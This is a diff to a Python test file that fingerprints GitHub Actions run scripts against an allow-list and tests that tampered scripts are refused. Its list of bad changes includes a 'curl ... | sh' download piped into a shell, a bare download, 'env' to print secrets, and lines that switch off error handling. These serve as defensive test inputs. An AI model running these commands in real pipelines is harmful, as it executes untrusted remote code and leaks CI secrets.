@@ -12,8 +12,12 @@
 import re
 from pathlib import Path
 
+import hashlib
+
 import pytest
 import yaml
+
+from allowed_workflow_steps import ALLOWED_RUN_STEPS
 
 ROOT = Path(__file__).resolve().parent.parent
 WORKFLOWS = ROOT / ".github" / "workflows"
@@ -305,6 +309,74 @@ def test_the_good_workflow_passes_the_shape_check():
 @pytest.mark.parametrize("label", sorted(BAD_WORKFLOWS))
 def test_every_bad_workflow_is_refused_by_the_shape_check(label):
     assert workflow_shape_problems(BAD_WORKFLOWS[label](scan_document())) != [], label
+
+
+# In plain English: a short fingerprint of a script (extra spaces at line ends and blank lines at the ends do not count).
+def fingerprint(run):
+    return "sha256:" + hashlib.sha256("\n".join(line.rstrip() for line in run.strip().splitlines()).encode("utf-8")).hexdigest()
+
+
+# In plain English: every script in a workflow whose fingerprint is not on the allowed list, as plain sentences with the fingerprint to add.
+def run_step_problems(document, allowed=ALLOWED_RUN_STEPS):
+    problems = []
+    for job_name, job in document["jobs"].items():
+        for number, step in enumerate(job["steps"], 1):
+            if "run" in step and fingerprint(step["run"]) not in allowed:
+                problems.append(f"job '{job_name}' step {number} ({step.get('name', 'unnamed')}) runs a script that is not on the allowed list; fingerprint {fingerprint(step['run'])}")
+    return problems
+
+
+# In plain English: the listed fingerprints that no script in the given workflows has any more.
+def unused_run_steps(documents, allowed=ALLOWED_RUN_STEPS):
+    seen = {fingerprint(step["run"]) for document in documents for job in document["jobs"].values() for step in job["steps"] if "run" in step}
+    return sorted(set(allowed) - seen)
+
+
+@pytest.mark.owasp("A03", 1035, 1395)
+@pytest.mark.owasp("A08", 829, 494)
+def test_every_script_a_workflow_runs_is_on_the_allowed_list():
+    documents = {workflow.name: yaml.safe_load(workflow.read_text(encoding="utf-8")) for workflow in sorted(WORKFLOWS.glob("*.yml"))}
+    for name, document in documents.items():
+        assert run_step_problems(document) == [], name
+    assert unused_run_steps(documents.values()) == [], "listed in tests/allowed_workflow_steps.py but no workflow runs it: remove it"
+
+
+@pytest.mark.owasp("A03", 1035, 1395)
+def test_a_listed_script_that_no_workflow_runs_is_reported():
+    document = {"jobs": {"a": {"steps": [{"run": "echo one"}]}}}
+    allowed = {fingerprint("echo one"): "one", fingerprint("echo two"): "two"}
+    assert unused_run_steps([document], allowed) == [fingerprint("echo two")]
+    assert unused_run_steps([document], {fingerprint("echo one"): "one"}) == []
+
+
+BAD_SCRIPT_CHANGES = {
+    "a download piped into a shell": lambda run: run + "\ncurl -s https://example.com/x.sh | sh",
+    "a download": lambda run: "curl -O https://example.com/x\n" + run,
+    "a failure swallowed": lambda run: run + " || true",
+    "errors switched off": lambda run: "set +e\n" + run,
+    "the script ended early": lambda run: "exit 0\n" + run,
+    "a changed command": lambda run: run.replace("docker", "podman", 1) if "docker" in run else run + "\necho changed",
+    "an extra line": lambda run: run + "\necho extra",
+    "a secret printed": lambda run: run + "\nenv",
+}
+
+
+@pytest.mark.owasp("A03", 1035, 1395)
+@pytest.mark.owasp("A08", 829, 494)
+@pytest.mark.parametrize("label", sorted(BAD_SCRIPT_CHANGES))
+def test_every_change_to_a_workflow_script_is_refused_until_it_is_listed(label):
+    document = yaml.safe_load((WORKFLOWS / ("tests.yml" if (WORKFLOWS / "tests.yml").exists() else "dependency-audit.yml")).read_text(encoding="utf-8"))
+    job = next(iter(document["jobs"].values()))
+    step = next(step for step in job["steps"] if "run" in step)
+    step["run"] = BAD_SCRIPT_CHANGES[label](step["run"])
+    assert run_step_problems(document) != [], label
+    assert run_step_problems(document, allowed={**ALLOWED_RUN_STEPS, fingerprint(step["run"]): "approved"}) == []  # adding the fingerprint is how a change is approved
+
+
+@pytest.mark.owasp("A03", 1035, 1395)
+def test_a_whitespace_difference_at_the_end_of_lines_does_not_change_a_fingerprint():
+    assert fingerprint("echo a  \necho b\n\n") == fingerprint("echo a\necho b")
+    assert fingerprint("echo a") != fingerprint("echo b")
 
 
 def expected_scan_document():
